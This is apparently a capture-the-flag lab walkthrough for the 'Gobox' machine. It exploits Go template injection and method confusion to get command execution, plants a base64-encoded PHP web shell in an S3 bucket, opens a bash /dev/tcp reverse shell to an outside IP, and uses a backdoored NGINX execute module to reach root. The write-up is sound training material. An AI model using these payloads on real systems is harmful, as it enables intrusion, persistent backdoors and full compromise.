## Gobox

### Lab Details 

- Difficulty: Medium
- Type: Web App, Go Lang, SSTI, Go Method Confusion, AWS, NGINX, Linux

#### Enumeration
- run nmap 
```bash
$ nmap -p- -A -sC --min-rate 1000 -T4 10.129.95.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-30 21:40 CDT
Nmap scan report for 10.129.95.236
Host is up (0.0022s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp    open     http        nginx
|_http-title: Hacking eSports | {{.Title}}
4415/tcp  filtered brcd-vr-req
4566/tcp  open     http        nginx
|_http-title: 403 Forbidden
8080/tcp  open     http        nginx
|_http-title: Hacking eSports | Home page
9000/tcp  filtered cslistener
9001/tcp  filtered tor-orport
9002/tcp  filtered dynamid
26324/tcp filtered unknown
43114/tcp filtered unknown
```
- looking at port 80, only the `index.php` can be found.
![[index.php.png]]
- looking at port 8080, there is an login form also has a "Forgot Password" function 
#### Initial Foothold 
- testing login the login form with SQLi as well as some guessing unable to login
- from the title of web page served on port 80 we see that its mentions title `{{.Title}}` from that info we can deduce that the web app is using some sort of template engine to serve the web contents 
- from the header for "Forgot Password" request to `/forgot`, we see that the server is running `Golang` 
![[header info.png]]

- search `golang SSTI` we find https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to which is a blog on SSTI for `Golang` 
- the blog mentions a couple of payload we can test e.g. `{{ . }}`
- with `{{ . }}` we get a credential
![[golang ssti.png]]
- after login in on port 8080, we see below code
- its a simple web server written in `Golang`
- the function `DebugCmd` looks interesting to us, its taking a string input as command and executes the command
- we can attempt to manipulate the function via `SSTI` found earlier, this attack is called `SSTI Method Confusion`, more on `SSTI Method Confusion` https://dev.to/pirateducky/ssti-method-confusion-in-go-517p
![[golang web server.png]]
- below is an example of `SSTI Method Confusion` payload
![[Go method confusion.png]]
- `.aws` directory exists in the root directory and `aws cli` exists on the target
- we can attempt to use `aws cli` to enumerate `aws` related services such as `S3`
```bash
## list all buckets
$ aws s3 ls
2025-08-31 02:32:28 website

## list a bucket
$ aws s3 ls s3://website

PRE css/
2025-08-31 02:32:28    1294778 bottom.png
2025-08-31 02:32:28     165551 header.png
2025-08-31 02:32:28          5 index.html
2025-08-31 02:32:28       1803 index.php
```
- we see that the application running on port 80 is stored on `AWS S3` and we are unable to obtain a `RCE` with `SSTI` vulnerability
- we can attempt to inject a web shell in `S3` 
```bash
## creating the payload

$ echo -n "<?= system(\$_REQUEST[cmd]); ?>" | base64

PD89IHN5c3RlbSgkX1JFUVVFU1RbY21kXSk7Pz4=
## actual payload
$ echo -n PD89IHN5c3RlbSgkX1JFUVVFU1RbY21kXSk7Pz4= | base64 -d > /tmp/webshell.php

## copy across on to burpsuite 
{{ .DebugCmd "echo -n PD89IHN5c3RlbSgkX1JFUVVFU1RbY21kXSk7Pz4= | base64 -d > /tmp/webshell.php" }}

## moving webshell to S3 bucket
$ aws s3 cp /tmp/webshell.php s3://website/webshell.php

## accessing it 
http://10.129.95.236/webshell.php?cmd=id

http://10.129.95.236/webshell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.35/4444 0>&1'
```

#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas.sh`
- found couple of interesting files relating to `NGINX`
```config
/etc/nginx/nginx.conf
/etc/init.d/nginx
/etc/nginx/site-enabled/default
```
- after checking `/etc/nginx/site-enabled/default` we see it has `command on;` specified 
- reference https://github.com/limithit/NginxExecute
```bash
www-data@gobox:/etc/nginx$ ls
ls
conf.d
fastcgi.conf
fastcgi_params
koi-utf
koi-win
mime.types
modules-available
modules-enabled
nginx.conf
proxy_params
scgi_params
sites-available
sites-enabled
snippets
uwsgi_params
win-utf
www-data@gobox:/etc/nginx$ cd modules-enabled;ls
cd modules-enabled;ls
50-backdoor.conf
50-mod-http-image-filter.conf
50-mod-http-xslt-filter.conf
50-mod-mail.conf
50-mod-stream.conf
www-data@gobox:/etc/nginx/modules-enabled$ cat 50-backdoor.conf
cat 50-backdoor.conf
load_module modules/ngx_http_execute_module.so;
## check ngx_http_execute_module.so
www-data@gobox:/usr/share/nginx$ ls
ls
html
modules
modules-available
www-data@gobox:/usr/share/nginx$ cd modules
cd modules
www-data@gobox:/usr/share/nginx/modules$ ls
ls
ngx_http_execute_module.so
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_module.so
www-data@gobox:/usr/share/nginx/modules$ strings ngx_http_execute_module.so | grep run
<ules$ strings ngx_http_execute_module.so | grep run
ippsec.run
```
- from the reference above we can exploit this with below
```bash
## view-source:http://192.168.18.22/?system.run[ifconfig]
$ cat /etc/nginx/sites-enabled/default
<snip>
server {
	listen 127.0.0.1:8000;
	location / {
		command on;
	} 
}
## curl http://127.0.0.1:8000/?system.run[id]
www-data@gobox:/usr/share/nginx/modules$ curl -g "http://127.0.0.1:8000/?ippsec.run[cd /root/; cat ./root.txt]"
<modules$ curl http://127.0.0.1:8000/?ippsec.run[id]
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    39  100    39    0     0   7800      0 --:--:-- --:--:-- --:--:--  7800
uid=0(root) gid=0(root) groups=0(root)

```
#### Resources

#### Lesson Learned
- `Golang SSTI`

